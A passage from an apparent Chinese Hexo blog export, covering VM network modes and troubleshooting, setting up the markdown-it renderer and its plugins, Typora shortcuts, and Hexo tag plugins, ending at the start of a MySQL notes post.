<h2 id="虚拟机">虚拟机</h2>
<h3 id="三种网络模式">三种网络模式</h3>
<p><strong>桥接</strong></p>
<p>在网络网卡上安装了一个桥接协议，让这块网卡处于混杂模式，可以同时连接多个网络的做法。</p>
<p>桥接下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样查在这个交换机当中，所以所有桥接下网卡与网卡都是交换模式的，相互可以访问而不干扰。</p>
<p><img src="/posts/2c8b313c//Users/Administrator/Corazon/blog/source/_posts/%E3%80%90Linux%E3%80%91%E6%80%BB%E7%BB%93/20061909046cf0a4cafbe52ded65acac.jpeg" alt="img"></p>
<p><strong>Host-only</strong>（仅与主机通信）</p>
<p>虚拟机使用VMnet1网卡与主机单独组网,主机对于虚拟机相当于路由器</p>
<p><img src="/posts/2c8b313c//Users/Administrator/Corazon/blog/source/_posts/%E3%80%90Linux%E3%80%91%E6%80%BB%E7%BB%93/5b8910196f03cc08e8e20c7619817a65.jpeg" alt="img"></p>
<p><strong>NAT</strong></p>
<p>虚拟机使用VMnet8网卡与主机单独组网,主机对于虚拟机相当于路由器，VMnet8网卡通过NAT地址转换协议与物理机网卡通信</p>
<p><img src="/posts/2c8b313c//Users/Administrator/Corazon/blog/source/_posts/%E3%80%90Linux%E3%80%91%E6%80%BB%E7%BB%93/ceb6926bc18279d63927d02d1214e341.jpeg" alt="img"></p>
<p><img src="/posts/2c8b313c//Users/Administrator/Corazon/blog/source/_posts/%E3%80%90Linux%E3%80%91%E6%80%BB%E7%BB%93/3a7cb1671fbea88783a3a741a12ab342.jpeg" alt="img"></p>
<h3 id="常见问题">常见问题</h3>
<h4 id="修改静态地址后发现无法ping外网">修改静态地址后发现无法ping外网</h4>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">需要设置网关<span class="built_in"></span></span><br><span class="line"><span class="built_in">route </span><span class="built_in">add</span><span class="built_in"> default </span>gw 192.168.33.1</span><br><span class="line">添加nameserver</span><br><span class="line">vi /etc/resolv.conf</span><br><span class="line">nameserver 192.168.33.1</span><br><span class="line">12345</span><br></pre></td></tr></table></figure>
<h4 id="虚拟机克隆后eth0消失">虚拟机克隆后eth0消失</h4>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">直接修改  <span class="regexp">/etc/</span>sysconfig<span class="regexp">/network-script/i</span>fcfg-eth0</span><br><span class="line">删掉UUID  HWADDR</span><br><span class="line">配置静态地址</span><br><span class="line">然后：</span><br><span class="line">rm -rf 　<span class="regexp">/etc/u</span>dev<span class="regexp">/rules.d/</span><span class="number">70</span>-persistent-net.rules</span><br><span class="line">然后 reboot</span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Hexo】更高级的Markdown渲染器——hexo-renderer-markdown-it</title>
    <url>/posts/e3e8d0c4/</url>
    <content><![CDATA[<p>Hexo 默认搭配的 Markdown 渲染器是 hexo-renderer-marked，但其支持的渲染格式有限，不利于自由写作。因此，今天教大家如何更换为功能更加强大，渲染速度更快的 hexo-renderer-markdown-it 渲染器，并且还会详细介绍常用插件的配置，实现更优雅的 Markdown 写作。</p>
<p>container和footnote不知道为什么不能使用，估计也用不上，暂时不处理了。原文在参考文章里。</p>
<h2 id="安装">安装</h2>
<p>卸载 <code>hexo-renderer-marked</code></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">npm un hexo-renderer-marked <span class="comment">--save</span></span><br></pre></td></tr></table></figure>
<p>安装 <code>hexo-renderer-markdown-it</code></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-markdown-<span class="keyword">it</span> <span class="comment">--save</span></span><br></pre></td></tr></table></figure>
<h2 id="配置">配置</h2>
<p>将如下文本复制粘贴到 <a href="https://so.csdn.net/so/search?q=Hexo&amp;spm=1001.2101.3001.7020">Hexo</a> 的配置文件 <code>_config.yml</code> 的尾部</p>
<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">markdown</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">preset</span><span class="punctuation">:</span> <span class="string">&quot;default&quot;</span></span><br><span class="line">  <span class="attribute">render</span><span class="punctuation">:</span></span><br><span class="line">    <span class="attribute">html</span><span class="punctuation">:</span> <span class="string">true</span></span><br><span class="line">    <span class="attribute">xhtmlOut</span><span class="punctuation">:</span> <span class="string">false</span></span><br><span class="line">    <span class="attribute">langPrefix</span><span class="punctuation">:</span> <span class="string">&quot;language-&quot;</span></span><br><span class="line">    <span class="attribute">breaks</span><span class="punctuation">:</span> <span class="string">true</span></span><br><span class="line">    <span class="attribute">linkify</span><span class="punctuation">:</span> <span class="string">true</span></span><br><span class="line">    <span class="attribute">typographer</span><span class="punctuation">:</span> <span class="string">true</span></span><br><span class="line">    <span class="attribute">quotes</span><span class="punctuation">:</span> <span class="string">&quot;“”‘’&quot;</span></span><br><span class="line">  <span class="attribute">enable_rules</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">disable_rules</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">plugins</span><span class="punctuation">:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-abbr</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-cjk-breaks</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-deflist</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-emoji</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-footnote</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-ins</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-mark</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-sub</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-sup</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-checkbox</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-imsize</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-expandable</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">name: markdown-it-container</span></span><br><span class="line">      <span class="attribute">options</span><span class="punctuation">:</span> <span class="string">success</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">name: markdown-it-container</span></span><br><span class="line">      <span class="attribute">options</span><span class="punctuation">:</span> <span class="string">tips</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">name: markdown-it-container</span></span><br><span class="line">      <span class="attribute">options</span><span class="punctuation">:</span> <span class="string">warning</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">name: markdown-it-container</span></span><br><span class="line">      <span class="attribute">options</span><span class="punctuation">:</span> <span class="string">danger</span></span><br><span class="line">  <span class="attribute">anchors</span><span class="punctuation">:</span></span><br><span class="line">    <span class="attribute">level</span><span class="punctuation">:</span> <span class="string">2</span></span><br><span class="line">    <span class="attribute">collisionSuffix</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="attribute">permalink</span><span class="punctuation">:</span> <span class="string">false</span></span><br><span class="line">    <span class="attribute">permalinkClass</span><span class="punctuation">:</span> <span class="string">&quot;header-anchor&quot;</span></span><br><span class="line">    <span class="attribute">permalinkSide</span><span class="punctuation">:</span> <span class="string">&quot;left&quot;</span></span><br><span class="line">    <span class="attribute">permalinkSymbol</span><span class="punctuation">:</span> <span class="string">&quot;¶&quot;</span></span><br><span class="line">    <span class="attribute">case</span><span class="punctuation">:</span> <span class="string">0</span></span><br><span class="line">    <span class="attribute">separator</span><span class="punctuation">:</span> <span class="string">&quot;-&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="插件">插件</h2>
<p>本章节讲述各种插件的用法、配置和注意事项。</p>
<h3 id="安装-2">安装</h3>
<p>分别使用 <code>npm</code> 命令安装以下三个插件：</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">npm</span> i markdown-<span class="literal">it</span>-checkbox</span><br><span class="line"><span class="built_in">npm</span> i markdown-<span class="literal">it</span>-imsize</span><br><span class="line"><span class="built_in">npm</span> i markdown-<span class="literal">it</span>-expandable</span><br></pre></td></tr></table></figure>
<p>其它插件 <code>hexo-renderer-markdown-it</code> 渲染器自带的有，不要安装。</p>
<h3 id="用法">用法</h3>
<h4 id="基础">基础</h4>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
<th>语法</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>markdown-it-abbr</td>
<td>注释</td>
<td><code>*[HTML]: 超文本标记语言</code></td>
<td>*[HTML]: 超文本标记语言</td>
</tr>
<tr>
<td>markdown-it-emoji</td>
<td>表情</td>
<td><code>:)</code>  <code>:crab:</code>  <code>:horse:</code></td>
<td>😃 🦀 🐴</td>
</tr>
<tr>
<td>markdown-it-footnote</td>
<td>脚注</td>
<td><code>参考文献&lt;sup id=&quot;fnref:1&quot;&gt;&lt;a href=&quot;#fn:1&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;</code></td>
<td>参考文献<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup></td>
</tr>
<tr>
<td>markdown-it-ins</td>
<td>下划线</td>
<td><code>++下划线++</code></td>
<td><ins>下划线</ins></td>
</tr>
<tr>
<td>markdown-it-mark</td>
<td>突出显示</td>
<td><code>==标记==</code></td>
<td><mark>标记</mark></td>
</tr>
<tr>
<td>markdown-it-sub</td>
<td>下标</td>
<td><code>H~2~O</code></td>
<td>H<sub>2</sub>O</td>
</tr>
<tr>
<td>markdown-it-sup</td>
<td>上标</td>
<td><code>X^2^</code></td>
<td>X<sup>2</sup></td>
</tr>
<tr>
<td>markdown-it-checkbox</td>
<td>复选框</td>
<td><input type="checkbox" id="checkbox1"><label for="checkbox1"></label>未选 <br> <input type="checkbox" id="checkbox0" checked="true"><label for="checkbox0"></label>选中</td>
<td><img src="/posts/e3e8d0c4//image-20241111151833850.png" alt="image-20241111151833850"></td>
</tr>
</tbody>
</table>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox2"><label for="checkbox2">未选</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox3" checked="true"><label for="checkbox3">选中</label></p>
</li>
</ul>
<h4 id="进阶">进阶</h4>
<blockquote>
<p><a href="https://github.com/tatsy/markdown-it-imsize">markdown-it-imsize</a>：自定义图片宽高。</p>
</blockquote>
<p>语法：（<strong>注意</strong>：<code>=100x200</code> 前面有一个空格）</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">!<span class="selector-attr">[test]</span>(<span class="number">006</span>.png =<span class="number">100</span>x200)</span><br></pre></td></tr></table></figure>
<p><img src="/posts/e3e8d0c4//006.png" alt="test" width="100" height="200"></p>
<blockquote>
<p><a href="https://github.com/bioruebe/markdown-it-collapsible">markdown-it-expandable</a>：折叠/展开内容。</p>
</blockquote>
<p>语法：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">+++</span> <span class="strong">**点击折叠**</span></span><br><span class="line"><span class="section">这是被隐藏的内容</span></span><br><span class="line"><span class="section">+++</span></span><br></pre></td></tr></table></figure>
<p>效果：</p>
<details open>
<summary><span class="pre-summary">&nbsp;</span><strong>点击折叠</strong></summary><p>这是被隐藏的内容</p>
</details>
<blockquote>
<p><a href="https://github.com/markdown-it/markdown-it-container">markdown-it-container</a>：自定义容器。</p>
</blockquote>
<p>语法：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="meta">:::</span> tips</span><br><span class="line"><span class="strong">**提示**</span></span><br><span class="line">这是一个提示</span><br><span class="line"><span class="meta">:::</span></span><br><span class="line"></span><br><span class="line"><span class="meta">:::</span> warning</span><br><span class="line"><span class="strong">**注意**</span></span><br><span class="line">这是一个警告</span><br><span class="line"><span class="meta">:::</span></span><br><span class="line"></span><br><span class="line"><span class="meta">:::</span> danger</span><br><span class="line"><span class="strong">**警告**</span></span><br><span class="line">这是一个危险信号</span><br><span class="line"><span class="meta">:::</span></span><br><span class="line"></span><br><span class="line"><span class="meta">:::</span> success</span><br><span class="line"><span class="strong">**成功**</span></span><br><span class="line">这是一个成功信号</span><br><span class="line"><span class="meta">:::</span></span><br></pre></td></tr></table></figure>
<p>效果：</p>
<div class="tips">
<p><strong>提示</strong><br>
这是一个提示</p>
</div>
<div class="warning">
<p><strong>注意</strong><br>
这是一个警告</p>
</div>
<div class="danger">
<p><strong>警告</strong><br>
这是一个危险信号</p>
</div>
<div class="success">
<p><strong>成功</strong><br>
这是一个成功信号</p>
</div>
<p>本文参考：</p>
<p><a href="https://blog.csdn.net/qq_42951560/article/details/123596899">【Hexo】选择更高级的Markdown渲染器</a></p>
]]></content>
      <categories>
        <category>博客写作</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>【Typora】typora快捷键</title>
    <url>/posts/d6f6acd6/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th style="text-align:center">功能</th>
<th style="text-align:center">快捷键</th>
<th style="text-align:center">功能</th>
<th style="text-align:center">快捷键</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">加粗</td>
<td style="text-align:center">Ctrl+B</td>
<td style="text-align:center">插入图像</td>
<td style="text-align:center">Ctrl+Shift+I</td>
</tr>
<tr>
<td style="text-align:center">斜体</td>
<td style="text-align:center">Ctrl+I</td>
<td style="text-align:center">删除线</td>
<td style="text-align:center">Alt+Shift+5</td>
</tr>
<tr>
<td style="text-align:center">下划线</td>
<td style="text-align:center">Ctrl+U</td>
<td style="text-align:center">公式块</td>
<td style="text-align:center">Ctrl+Shift+M</td>
</tr>
<tr>
<td style="text-align:center">超链接</td>
<td style="text-align:center">Ctrl+K</td>
<td style="text-align:center">代码块</td>
<td style="text-align:center">Ctrl+Shift+K</td>
</tr>
<tr>
<td style="text-align:center">表格</td>
<td style="text-align:center">Ctrl+T</td>
<td style="text-align:center">代码段</td>
<td style="text-align:center">Ctrl+Shift+`</td>
</tr>
<tr>
<td style="text-align:center">引用</td>
<td style="text-align:center">&gt;+空格</td>
<td style="text-align:center">退出引用</td>
<td style="text-align:center">Shift+Tab</td>
</tr>
<tr>
<td style="text-align:center">段落</td>
<td style="text-align:center">Ctrl+0</td>
<td style="text-align:center">有序列表</td>
<td style="text-align:center">Ctrl+Shift+[</td>
</tr>
<tr>
<td style="text-align:center">标题</td>
<td style="text-align:center">Ctrl+数字</td>
<td style="text-align:center">无序列表</td>
<td style="text-align:center">Ctrl+Shift+]</td>
</tr>
<tr>
<td style="text-align:center">全选</td>
<td style="text-align:center">Ctrl+A</td>
<td style="text-align:center">选中行/句</td>
<td style="text-align:center">Ctrl+L</td>
</tr>
<tr>
<td style="text-align:center">选中段落</td>
<td style="text-align:center">Ctrl+E</td>
<td style="text-align:center">选中当前词</td>
<td style="text-align:center">Ctrl+D</td>
</tr>
<tr>
<td style="text-align:center">跳转所选</td>
<td style="text-align:center">Ctrl+J</td>
<td style="text-align:center">跳转文首/末</td>
<td style="text-align:center">Ctrl+Home/End</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">源代码模式</td>
<td style="text-align:center">Ctrl+/</td>
</tr>
</tbody>
</table>
<span id="more"></span>
<p>下方背诵表</p>
<p>  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓</p>
<table>
<thead>
<tr>
<th style="text-align:center">功能</th>
<th style="text-align:center">快捷键</th>
<th style="text-align:center">功能</th>
<th style="text-align:center">快捷键</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">加粗</td>
<td style="text-align:center"></td>
<td style="text-align:center">插入图像</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">斜体</td>
<td style="text-align:center"></td>
<td style="text-align:center">删除线</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">下划线</td>
<td style="text-align:center"></td>
<td style="text-align:center">公式块</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">超链接</td>
<td style="text-align:center"></td>
<td style="text-align:center">代码块</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">表格</td>
<td style="text-align:center"></td>
<td style="text-align:center">代码段</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">引用</td>
<td style="text-align:center"></td>
<td style="text-align:center">退出引用</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">段落</td>
<td style="text-align:center"></td>
<td style="text-align:center">有序列表</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">标题</td>
<td style="text-align:center"></td>
<td style="text-align:center">无序列表</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">全选</td>
<td style="text-align:center"></td>
<td style="text-align:center">选中行/句</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">选中段落</td>
<td style="text-align:center"></td>
<td style="text-align:center">选中当前词</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">跳转所选</td>
<td style="text-align:center"></td>
<td style="text-align:center">跳转文首/末</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">源代码模式</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>博客写作</category>
      </categories>
  </entry>
  <entry>
    <title>【Hexo】标签插件使用</title>
    <url>/posts/eefe99e9/</url>
    <content><![CDATA[<p>「tag 插件」(Tag Plugin) 是 Hexo 提供的一种快速生成特定内容的方式。 例如，在标准 Markdown 语法中，我们无法指定图片的大小。这种情景，我们即可使用标签来解决。 Hexo 内置来许多标签来帮助写作者可以更快的书写， 完整的标签列表 可以参考 <a href="https://hexo.io/docs/tag-plugins.html">Hexo 官网</a>。 另外，Hexo 也开放来接口给主题，使主题有可能提供给写作者更简便的写作方法。</p>
<h2 id="引用块">引用块</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>blockquote</strong></p>
</li>
</ul>
<p>在文章中插入引言，可包含作者、来源和标题，均可选。</p>
<p>标签方式：使用 <code>blockquote</code> 或者 简写 <code>quote</code>。</p>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">block</span>quote author, <span class="name">source</span> link source_link_title <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">content</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endblock</span>quote <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>
<p>示例如下：</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name">blockquote</span> Corazon, https://www.mcorazon.top Corazon博客首页 %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">这个世界总有黑夜</span></span><br><span class="line"><span class="language-xml">但是我们总发着光</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name">endblockquote</span> %&#125;</span></span><br></pre></td></tr></table></figure>
<blockquote><p>这个世界总有黑夜但是我们总发着光</p>
<footer><strong>Corazon,</strong><cite><a href="https://www.mcorazon.top">Corazon博客首页</a></cite></footer></blockquote>	
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>pullquote</strong></p>
</li>
</ul>
<p>pullquote 可以自定义引用块的样式</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">&#123;% pullquote [<span class="class"><span class="keyword">class</span>] %&#125;</span></span><br><span class="line"><span class="class"><span class="title">content</span></span></span><br><span class="line"><span class="class"></span>&#123;% endpullquote <span class="variable">%&#125;</span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>居中引用</strong></p>
</li>
</ul>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name">centerquote</span> %&#125;</span><span class="language-xml">blah blah blah</span><span class="template-tag">&#123;% <span class="name">endcenterquote</span> %&#125;</span></span><br></pre></td></tr></table></figure>
<blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>blah blah blah</p>

            <i class="fa fa-quote-right"></i>
          </blockquote>
<p>同时HTML 居中引用的方式也比较简单：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">blockquote </span>class=<span class="string">&quot;blockquote-center&quot;</span>&gt;<span class="keyword">blah </span><span class="keyword">blah </span><span class="keyword">blah&lt;/blockquote&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote class="blockquote-center">blah blah blah</blockquote>
<h2 id="代码块-a-id-dmk-a">代码块<a id="dmk"></a></h2>
<p>在文章中插入代码，包含指定语言、附加说明和网址，均可选。标签方式：使用 <code>codeblock</code> 或者 简写 <code>code</code>。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>codeblock代码块</p>
</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&#123;% codeblock <span class="selector-attr">[title]</span> <span class="selector-attr">[lang:language]</span> <span class="selector-attr">[url]</span> <span class="selector-attr">[link text]</span> <span class="selector-attr">[additional options]</span> %&#125;</span><br><span class="line"><span class="selector-tag">code</span> snippet</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>
<p>示例如下：</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name">codeblock</span> 示例代码 lang:objc https://www.mcorazon.top 博客首页 %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">[rectangle setX: 10 y: 10 width: 20 height: 20];</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name">endcodeblock</span> %&#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight objc"><figcaption><span>示例代码</span><a href="https://www.mcorazon.top/posts/eefe99e9/#dmk">代码块示例</a></figcaption><table><tr><td class="code"><pre><span class="line">[rectangle setX: <span class="number">10</span> y: <span class="number">10</span> width: <span class="number">20</span> height: <span class="number">20</span>];</span><br></pre></td></tr></table></figure>
<p>在 <code>additional options</code> 中，以 option:value 格式指定附加选项，例如 line_number:false（行数） first_line:5。</p>
<table>
<thead>
<tr>
<th style="text-align:center">Extra Options</th>
<th style="text-align:center">Description</th>
<th style="text-align:center">Default</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>line_number</code></td>
<td style="text-align:center">Show line number</td>
<td style="text-align:center"><code>true</code></td>
</tr>
<tr>
<td style="text-align:center"><code>line_threshold</code></td>
<td style="text-align:center">Only show line numbers as long as the numbers of lines of the code block exceed such threshold.</td>
<td style="text-align:center"><code>0</code></td>
</tr>
<tr>
<td style="text-align:center"><code>highlight</code></td>
<td style="text-align:center">Enable code highlighting</td>
<td style="text-align:center"><code>true</code></td>
</tr>
<tr>
<td style="text-align:center"><code>first_line</code></td>
<td style="text-align:center">Specify the first line number</td>
<td style="text-align:center"><code>1</code></td>
</tr>
<tr>
<td style="text-align:center"><code>mark</code></td>
<td style="text-align:center">Line highlight specific line(s), each value separated by a comma. Specify the number range using a dash Example: <code>mark:1,4-7,10</code> will mark lines 1, 4 to 7 and 10.</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"><code>wrap</code></td>
<td style="text-align:center">Wrap the code block in <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/table">``</a></td>
<td style="text-align:center"><code>true</code></td>
</tr>
</tbody>
</table>
<ul class="lvl-0">
<li class="lvl-2">
<p>反引号代码块<a id="fyhdmk"></a></p>
</li>
</ul>
<p>这与使用代码块相同，但使用了三个回车键来分隔代码块。</p>
<p>`` [language] [title] [url] [link text] code snippet ``</p>
<p>示例如下：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">```python <span class="selector-attr">[反引号代码块示例]</span> https:<span class="comment">//www.mcorazon.top/posts/eefe99e9/#fyhdmk 反引号代码块</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">&quot;hello-word&quot;</span>)</span></span> </span><br><span class="line">```</span><br></pre></td></tr></table></figure>
 <figure class="highlight python"><figcaption><span>[反引号代码块示例]</span><a href="https://www.mcorazon.top/posts/eefe99e9/#fyhdmk">反引号代码块</a></figcaption><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello-word&quot;</span>) </span><br></pre></td></tr></table></figure>
<h2 id="iframe">iframe</h2>
<p>在文章中嵌入 iframe，</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="selector-tag">iframe</span> url <span class="selector-attr">[width]</span> <span class="selector-attr">[height]</span> %&#125;</span><br></pre></td></tr></table></figure>
<p>示例如下：</p>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">if</span>rame //player.bilibili.com/player.html?isOutside=true&amp;aid=<span class="number">113446695739195</span>&amp;bvid=BV<span class="number">17</span>rDZYZEM<span class="number">1</span>&amp;cid=<span class="number">26669354075</span>&amp;p=<span class="number">1</span>  <span class="number">500</span>px <span class="number">250</span>px <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>
<iframe src="//player.bilibili.com/player.html?isOutside=true&aid=113446695739195&bvid=BV17rDZYZEM1&cid=26669354075&p=1" width="500px" height="250px" frameborder="0" loading="lazy" allowfullscreen></iframe>
<p>可能是因为主题的原因，目前video的iframe大小没有设置成功，但网页，图片可以设置。由于目前前端水平不足，暂时不处理。</p>
<p>以下HTML代码可实现同样的功能，不予演示。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;iframe <span class="attribute">src</span>=<span class="string">&quot;//player.bilibili.com/player.html?isOutside=true&amp;aid=113446695739195&amp;bvid=BV17rDZYZEM1&amp;cid=26669354075&amp;p=1&quot;</span> <span class="attribute">scrolling</span>=<span class="string">&quot;no&quot;</span> <span class="attribute">border</span>=<span class="string">&quot;0&quot;</span> <span class="attribute">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attribute">framespacing</span>=<span class="string">&quot;0&quot;</span>  <span class="attribute">allowfullscreen</span>=<span class="string">&quot;true&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<h2 id="图像">图像</h2>
<p>使用标签插入图像可以自定义图像的大小</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">&#123;% img [<span class="keyword">class</span> <span class="symbol">names</span>] /<span class="symbol">path</span>/<span class="symbol">to</span>/<span class="symbol">image</span> [<span class="symbol">width</span>] [<span class="symbol">height</span>] &#x27;&quot;<span class="symbol">title</span> <span class="symbol">text</span>&quot; &quot;<span class="symbol">alt</span> <span class="symbol">text</span>&quot;&#x27; %&#125;</span><br></pre></td></tr></table></figure>
<p>示例如下：</p>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">img</span> imgcls /【Hexo】标签插件使用/<span class="number">004</span>.png <span class="number">20</span>px <span class="number">20</span>px <span class="string">&#x27;&quot;004.png&quot; &quot;这就是我的头像&quot;&#x27;</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>
<img src="/posts/eefe99e9//004.png" class="imgcls" title="20px 20px &quot;004.png&quot; &quot;这就是我的头像&quot;">
<p><font class="notice"><em><s>mlgbzd</s>，一会儿行一会不行的</em></font></p>
<h2 id="Video-标签">Video 标签</h2>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">video</span> //player.bilibili.com/player.html?isOutside=true&amp;aid=<span class="number">113446695739195</span>&amp;bvid=BV<span class="number">17</span>rDZYZEM<span class="number">1</span>&amp;cid=<span class="number">26669354075</span>&amp;p=<span class="number">1</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>
<video src="//player.bilibili.com/player.html?isOutside=true&aid=113446695739195&bvid=BV17rDZYZEM1&cid=26669354075&p=1" preload="metadata" controls playsinline poster>Sorry, your browser does not support the video tag.</video>
<h2 id="链接">链接</h2>
<p>插入带有 target=“_blank” 属性的链接。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&#123;% link <span class="selector-tag">text</span> url <span class="selector-attr">[external]</span> <span class="selector-attr">[title]</span> %&#125;</span><br></pre></td></tr></table></figure>
<p>示例如下：</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">&#123;% link <span class="built_in">text</span> https:<span class="comment">// [external] [title] %&#125;</span></span><br></pre></td></tr></table></figure>
<div class="video-container"><iframe src="https://www.youtube.com/embed/lJIrF4YjHfQ" frameborder="0" loading="lazy" allowfullscreen></iframe></div>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/qq_41518277/article/details/101765886">Hexo标签插件的使用</a></p>
]]></content>
      <categories>
        <category>博客写作</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>【MySQL】MYSQL知识总结</title>
    <url>/posts/c826a854/</url>
    <content><![CDATA[<h2 id="数据库的三大范式">数据库的三大范式</h2>
<p>1、第一范式(1NF)是指数据库表的每一列都是不可分割的基本数据线；也就是说：每列的值具有原子性，不可再分割。<br>
